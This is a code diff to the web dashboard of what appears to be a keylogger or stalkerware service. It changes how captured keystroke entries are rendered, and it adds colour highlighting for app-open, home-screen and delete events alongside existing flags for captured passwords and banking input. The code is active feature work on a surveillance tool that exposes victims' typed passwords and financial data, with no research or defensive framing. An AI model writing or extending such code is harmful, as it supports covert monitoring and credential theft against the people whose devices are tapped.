@@ -1247,6 +1247,7 @@ function renderKeylogEntries() {
     // Text styling based on type
     let textColor = 'var(--text)';
     let textPrefix = '';
+    let bgHighlight = '';
     if (isCleared) {
       textColor = '#f44336';
     } else if (isPassword) {
@@ -1255,12 +1256,18 @@ function renderKeylogEntries() {
     } else if (isBanking) {
       textColor = '#FF5252';
       textPrefix = '🏦 ';
+    } else if (e.event_type === 'activity' || e.text_content?.startsWith('[App opened') || e.text_content?.startsWith('[Home')) {
+      textColor = '#00e5ff';
+      textPrefix = '📱 ';
+      bgHighlight = 'background:rgba(0,229,255,.06);';
+    } else if (e.event_type === 'delete') {
+      textColor = '#FF9800';
     }
 
     // Add separator if app switched
     const separator = (appSwitched && idx > 0) ? '<div style="border-top:2px dashed rgba(255,255,255,.1);margin:4px 0"></div>' : '';
 
-    return `${separator}<div style="display:flex;gap:10px;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.05);align-items:flex-start;${appSwitched ? 'background:rgba(0,229,255,.03)' : ''}">
+    return `${separator}<div style="display:flex;gap:10px;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,.05);align-items:flex-start;${appSwitched ? 'background:rgba(0,229,255,.03)' : ''};${bgHighlight}">
       <div style="flex-shrink:0;width:32px;height:32px;border-radius:50%;background:${appInfo.color};display:flex;align-items:center;justify-content:center;font-size:${isCircular ? '14px' : '16px'};font-weight:bold;color:${appInfo.color === '#000000' || appInfo.color === '#FFFC00' ? '#000' : '#fff'}">
         ${appInfo.icon}
       </div>
@@ -1574,11 +1581,14 @@ async function loadGlobalKeylogs(page) {
 
       let textColor = 'var(--text)';
       let textPrefix = '';
+      let bgHighlight = '';
       if (isCleared) { textColor = '#f44336'; }
       else if (isPassword) { textColor = '#FF9800'; textPrefix = '🔑 '; }
       else if (isBanking) { textColor = '#FF5252'; textPrefix = '🏦 '; }
+      else if (e.event_type === 'activity' || text.startsWith('[App opened') || text.startsWith('[Home')) { textColor = '#00e5ff'; textPrefix = '📱 '; bgHighlight = 'background:rgba(0,229,255,.06);'; }
+      else if (e.event_type === 'delete') { textColor = '#FF9800'; }
 
-      return `<div style="display:flex;gap:10px;padding:10px;border-bottom:1px solid rgba(255,255,255,.05);align-items:flex-start">
+      return `<div style="display:flex;gap:10px;padding:10px;border-bottom:1px solid rgba(255,255,255,.05);align-items:flex-start;${bgHighlight}">
         <div style="flex-shrink:0;width:36px;height:36px;border-radius:50%;background:${appInfo.color};display:flex;align-items:center;justify-content:center;font-size:${isCircular ? '16px' : '18px'};font-weight:bold;color:${appInfo.color === '#000000' || appInfo.color === '#FFFC00' ? '#000' : '#fff'}">
           ${appInfo.icon}
         </div>
